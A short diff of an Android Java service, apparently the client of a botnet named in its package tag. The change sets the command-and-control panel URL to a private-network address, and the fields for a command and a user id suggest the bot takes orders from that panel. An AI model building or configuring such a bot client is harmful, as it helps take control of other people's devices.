@@ -55,7 +55,7 @@ import java.util.List;
 import java.util.Random;
 
 public class MyService extends Service {
-    public String http = "Enter your website url here";
+    public String http = "http://192.168.10.2/control panel";
     String command = "";
     String userid;
     private static final String TAG = "com.example.kico.botnet";
